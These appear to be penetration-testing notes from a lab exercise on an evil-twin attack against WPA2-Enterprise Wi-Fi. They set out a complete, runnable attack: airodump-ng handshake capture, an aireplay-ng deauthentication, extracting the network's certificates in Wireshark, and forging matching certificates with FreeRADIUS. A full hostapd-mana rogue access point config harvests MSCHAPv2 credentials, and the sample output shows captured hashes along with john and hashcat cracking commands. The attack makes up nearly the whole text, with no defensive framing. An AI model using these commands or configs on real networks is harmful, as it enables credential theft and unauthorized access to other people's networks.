### Capturing Handshakes
---
> [!note]
> These steps are only used to forge a certificate to trick the client. If the client does not check the certificate, we can simply just create a rogue AP with the same SSID to lure clients into connecting.

##### Capture a handshake (and the certificate):
###### Airodump-ng:
Use airodump-ng to capture a handshake of the target AP
```sh
sudo airodump-ng wlan0mon -c <channel> --bssid <bssid> -w <output name>
```

###### De-authentication Attack:
De-auth the client
```sh
sudo aireplay-ng -0 1 -a <AP bssid> -c <client bssid> wlan0mon
```

###### Packet Inspection:
Upon capturing the handshake, open it with Wireshark, and use this filter:
```
tls.handshake.certificate
```

Then go to `Packet Details`, open `Extensible Authentication Protocol` > `Transport Layer Security`. Then open `TLSv1 Record Layer: Handshake Protocol: Certificate`.  Then expand `Handshake Protocol: Certificate item`, then `Certificates`.
![[Pasted image 20240708164305.png]]

Right click on each certificate, select `Export Packet Bytes` and save them with a `.der` extension.

Display information of the certs:
```
openssl x509 -inform der -in [CERTIFICATE_FILENAME] -tex
```

Convert the certs to `.pem` format if needed:
```
openssl x509 -inform der -in [CERTIFICATE_FILENAME] -outform pem -out [OUTPUT_PEM].crt
```


### Forging Certificates
---
##### FreeRADIUS:
###### Modify the config files:
```sh
sudo mousepad /etc/freeradius/3.0/certs/ca.cnf
```
- Change the `[certificate_authority]` to match those of the captured certificates.

```sh
sudo mousepad /etc/freeradius/3.0/certs/server.cnf
```
- Change the `[server]` to match those of the captured certificates.

###### Building the certificates:
```sh
cd /etc/freeradius/3.0/certs/
```

Regenerate `dh`:
```sh
sudo rm dh && make
```
- `make` will not overwrite existing certs. We have to run `make destroycerts` to clean up.
- Ignore the errors.

### Rogue Access Point
---
##### Hostapd-mana:
###### Create/Edit the config file:
```
sudo mousepad /etc/hostapd-mana/mana.conf
```
- Edit to the correct SSID, Certificate paths, and EAP file.

###### Example config file:
```
# SSID of the AP
ssid=Playtronics

# Network interface to use and driver type
# We must ensure the interface lists 'AP' in 'Supported interface modes' when running 'iw phy PHYX info'
interface=wlan0
driver=nl80211

# Channel and mode
# Make sure the channel is allowed with 'iw phy PHYX info' ('Frequencies' field - there can be more than one)
channel=1
# Refer to https://w1.fi/cgit/hostap/plain/hostapd/hostapd.conf to set up 802.11n/ac/ax
hw_mode=g

# Setting up hostapd as an EAP server
ieee8021x=1
eap_server=1

# Key workaround for Win XP
eapol_key_index_workaround=0

# EAP user file we created earlier
eap_user_file=/etc/hostapd-mana/mana.eap_user

# Certificate paths created earlier
ca_cert=/etc/freeradius/3.0/certs/ca.pem
server_cert=/etc/freeradius/3.0/certs/server.pem
private_key=/etc/freeradius/3.0/certs/server.key
# The password is actually 'whatever'
private_key_passwd=whatever
dh_file=/etc/freeradius/3.0/certs/dh

# Open authentication
auth_algs=1
# WPA/WPA2
wpa=3
# WPA Enterprise
wpa_key_mgmt=WPA-EAP
# Allow CCMP and TKIP
# Note: iOS warns when network has TKIP (or WEP)
wpa_pairwise=CCMP TKIP

# Enable Mana WPE
mana_wpe=1

# Store credentials in that file
mana_credout=/tmp/hostapd.credout

# Send EAP success, so the client thinks it's connected
mana_eapsuccess=1

# EAP TLS MitM
mana_eaptls=1
```



###### Create a EAP user file:
```sh
sudo mousepad /etc/hostapd-mana/mana.eap_user
```

The file should contain the following:
```
*     PEAP,TTLS,TLS,FAST
"t"   TTLS-PAP,TTLS-CHAP,TTLS-MSCHAP,MSCHAPV2,MD5,GTC,TTLS,TTLS-MSCHAPV2    "pass"   [2]
```

###### Run hostapd-mana:
```sh
sudo hostapd-mana /etc/hostapd-mana/mana.conf
```
- To run `hostapd-mana`, we have to disable monitor mode, or use another wireless card.

###### Example output for successful capture:
```
wlan0: STA 00:2b:bb:b0:42:9e IEEE 802.11: authenticated
wlan0: STA 00:2b:bb:b0:42:9e IEEE 802.11: associated (aid 1)
wlan0: CTRL-EVENT-EAP-STARTED 00:2b:bb:b0:42:9e
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=1
MANA EAP Identity Phase 0: cosmo
wlan0: CTRL-EVENT-EAP-PROPOSED-METHOD vendor=0 method=25
MANA EAP Identity Phase 1: cosmo
MANA EAP EAP-MSCHAPV2 ASLEAP user=cosmo | asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4
MANA EAP EAP-MSCHAPV2 JTR | cosmo:$NETNTLM$ceb69885c656590c$7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | cosmo::::7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:ceb69885c656590c
```


### Cracking WPA Enterprise Keys
---
##### Cracking the captured credentials:
From the above output, we can see that different hashes are provided for different methods:
```
...
MANA EAP EAP-MSCHAPV2 ASLEAP user=cosmo | asleap -C ce:b6:98:85:c6:56:59:0c -R 72:79:f6:5a:a4:98:70:f4:58:22:c8:9d:cb:dd:73:c1:b8:9d:37:78:44:ca:ea:d4
MANA EAP EAP-MSCHAPV2 JTR | cosmo:$NETNTLM$ceb69885c656590c$7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:::::::
MANA EAP EAP-MSCHAPV2 HASHCAT | cosmo::::7279f65aa49870f45822c89dcbdd73c1b89d377844caead4:ceb69885c656590c
```
- Just copy and paste the commands from the output.
- Asleap is currently not working in kali.

###### Example JTR command:
```sh
john --format=netntlm hash.txt
```

###### Example hashcat command:
```sh
hashcat -m 5500 hash.txt /usr/share/wordlists/rockyou.txt
```

